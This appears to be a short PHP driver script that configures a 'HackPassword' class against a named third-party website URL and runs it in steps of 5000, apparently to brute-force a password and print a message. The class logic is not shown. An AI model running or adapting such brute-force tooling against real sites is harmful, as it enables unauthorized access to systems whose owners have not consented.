<?php

ini_set('max_execution_time', 12000);

require_once 'classes/autoload.php';

use hack\HackPassword\HackPassword;

$hack = new HackPassword();

$result = $hack->setUrl('http://www.rollshop.co.il/test.php')
    ->setStep(5000)
    ->setStart(0)
    ->startHack();

if($result) {
    echo 'Линк на википедию: '.$hack->getMessage();
}